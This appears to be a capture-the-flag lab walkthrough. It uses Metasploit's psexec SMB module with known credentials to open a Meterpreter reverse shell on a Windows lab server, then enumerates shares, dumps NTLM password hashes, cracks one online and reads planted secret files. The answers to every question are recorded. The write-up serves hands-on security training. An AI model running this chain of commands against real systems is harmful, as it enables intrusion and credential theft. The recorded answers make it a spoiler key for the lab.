@@ -1,0 +1,274 @@
+Here we are compromising over SMD using exploit/windows/smb/psexec
+
+So we start our msfconsole and set all the options. 
+$ msfconsole
+msf6 > search exploit/windows/smb/psexec
+msf6 > use 0
+msf6 exploit(windows/smb/psexec) > options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   SERVICE_DESCRIPTION                    no        Service description to be used on target f
+                                                    or pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SMBSHARE                               no        The share to connect to, can be an admin s
+                                                    hare (ADMIN$,C$,...) or a normal read/writ
+                                                    e folder share
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/d
+                                         ocs/using-metasploit/basics/using-metasploit.html
+   RPORT      445              no        The target port (TCP)
+   SMBDomain  .                no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, no
+                                        ne)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+We need to set LHOST, RHOSTS, SMBPass, SMBUser
+msf6 exploit(windows/smb/psexec) > set LHOST 10.6.4.208
+LHOST => 10.6.4.208
+msf6 exploit(windows/smb/psexec) > set RHOST 10.10.228.114
+RHOST => 10.10.228.114
+msf6 exploit(windows/smb/psexec) > set SMBPass Password1
+SMBPass => Password1
+msf6 exploit(windows/smb/psexec) > set SMBUser ballen
+SMBUser => ballen
+
+Now it's time to run:
+msf6 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on 10.6.4.208:4444 
+[*] 10.10.228.114:445 - Connecting to the server...
+[*] 10.10.228.114:445 - Authenticating to 10.10.228.114:445 as user 'ballen'...
+[*] 10.10.228.114:445 - Selecting PowerShell target
+[*] 10.10.228.114:445 - Executing the payload...
+[+] 10.10.228.114:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Exploit completed, but no session was created.
+
+We ran into an error so I'll try again, it may be unstable... Success:
+msf6 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on 10.6.4.208:4444 
+[*] 10.10.228.114:445 - Connecting to the server...
+[*] 10.10.228.114:445 - Authenticating to 10.10.228.114:445 as user 'ballen'...
+[*] 10.10.228.114:445 - Selecting PowerShell target
+[*] 10.10.228.114:445 - Executing the payload...
+[+] 10.10.228.114:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (176198 bytes) to 10.10.228.114
+[*] Meterpreter session 1 opened (10.6.4.208:4444 -> 10.10.228.114:54743) at 2024-05-09 22:46:18 -0400
+
+meterpreter > 
+
+Now to answer questions...
+1. What is computer name: ACME-TEST
+meterpreter > sysinfo
+Computer        : ACME-TEST
+OS              : Windows Server 2019 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : FLASH
+Logged On Users : 7
+Meterpreter     : x86/windows
+
+2. What is the target domain: Flash
+meterpreter > shell
+Process 3980 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>echo %USERDOMAIN%
+echo %USERDOMAIN%
+FLASH
+
+3. What is the name of the share likely created by the user: speedster
+First we need to use a new module:
+
+C:\Windows\system32>^Z
+Background channel 1? [y/N]  y
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/psexec) > search post/windows/gather/enum_shares
+
+Matching Modules
+================
+
+   #  Name                             Disclosure Date  Rank    Check  Description
+   -  ----                             ---------------  ----    -----  -----------
+   0  post/windows/gather/enum_shares  .                normal  No     Windows Gather SMB Share Enumeration via Registry
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/enum_shares                                                                                       
+
+msf6 exploit(windows/smb/psexec) > use 0
+msf6 post(windows/gather/enum_shares) >
+
+Now we need to set the session and run it:
+msf6 post(windows/gather/enum_shares) > set session 1
+session => 1
+msf6 post(windows/gather/enum_shares) > run
+
+[*] Running module against ACME-TEST (10.10.228.114)
+[*] The following shares were found:
+[*]     Name: SYSVOL
+[*]     Path: C:\Windows\SYSVOL\sysvol
+[*]     Remark: Logon server share 
+[*]     Type: DISK
+[*] 
+[*]     Name: NETLOGON
+[*]     Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
+[*]     Remark: Logon server share 
+[*]     Type: DISK
+[*] 
+[*]     Name: speedster
+[*]     Path: C:\Shares\speedster
+[*]     Type: DISK
+[*] 
+[*] Post module execution completed
+
+4. What is the NTLM has of the jchambers user: 69596c7aa1e8daee17f8e78870e25a5c
+First we need to rejoin the session:
+msf6 post(windows/gather/enum_shares) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-  10.6.4.208:4444 -> 10.10.228
+                                     TEST                         .114:54743 (10.10.228.114)
+
+msf6 post(windows/gather/enum_shares) > session 1
+[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
+msf6 post(windows/gather/enum_shares) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter >
+
+Now we need to run hashdump
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
+ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
+jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
+lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
+erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
+ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:b8d47eb8cccd87719d88b5a217ccf3f1:::
+
+
+5. What is the cleartext password of the jchambers user: Trustno1
+For this I checked an online password cracker: https://crackstation.net/
+
+6. Where is the "secrets.txt" file located: c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
+meterpreter > search -f secrets.txt
+
+7. What is the Twitter password revealed in the "secrets.txt" file: KDSvbsw3849!
+
+meterpreter > shell
+Process 3352 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+C:\Windows\system32>cd /
+cd /
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\
+
+11/14/2018  06:56 AM    <DIR>          EFI
+07/30/2021  06:52 AM    <DIR>          inetpub
+05/13/2020  05:58 PM    <DIR>          PerfLogs
+11/14/2018  04:10 PM    <DIR>          Program Files
+03/11/2021  07:29 AM    <DIR>          Program Files (x86)
+07/30/2021  07:18 AM    <DIR>          Shares
+03/17/2021  03:00 PM    <DIR>          Users
+07/30/2021  07:01 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               8 Dir(s)  15,248,142,336 bytes free
+
+C:\>cd Program Files (x86)/Windows Multimedia Platform
+cd Program Files (x86)/Windows Multimedia Platform
+
+C:\Program Files (x86)\Windows Multimedia Platform>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Program Files (x86)\Windows Multimedia Platform
+
+07/30/2021  08:33 PM    <DIR>          .
+07/30/2021  08:33 PM    <DIR>          ..
+07/30/2021  07:44 AM                35 secrets.txt
+09/15/2018  07:12 AM            40,432 sqmapi.dll
+               2 File(s)         40,467 bytes
+               2 Dir(s)  15,248,142,336 bytes free
+
+C:\Program Files (x86)\Windows Multimedia Platform>cat secrets.txt
+cat secrets.txt
+'cat' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Program Files (x86)\Windows Multimedia Platform>type secrets.txt
+type secrets.txt
+My Twitter password is KDSvbsw3849!
+
+8. Where is the "realsecret.txt" file located: c:\inetpub\wwwroot\realsecret.txt
+meterpreter > search -f realsecret.txt
+Found 1 result...
+=================
+
+Path                               Size (bytes)  Modified (UTC)
+----                               ------------  --------------
+c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 04:30:24 -0400
+
+9: What is the real secret: The Flash is the fastest man alive
+meterpreter > shell
+Process 1320 created.
+Channel 3 created.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd /
+cd /
+
+C:\>cd inetpub/wwwroot
+cd inetpub/wwwroot
+
+C:\inetpub\wwwroot>type realsecret.txt
+type realsecret.txt
+The Flash is the fastest man alive
+
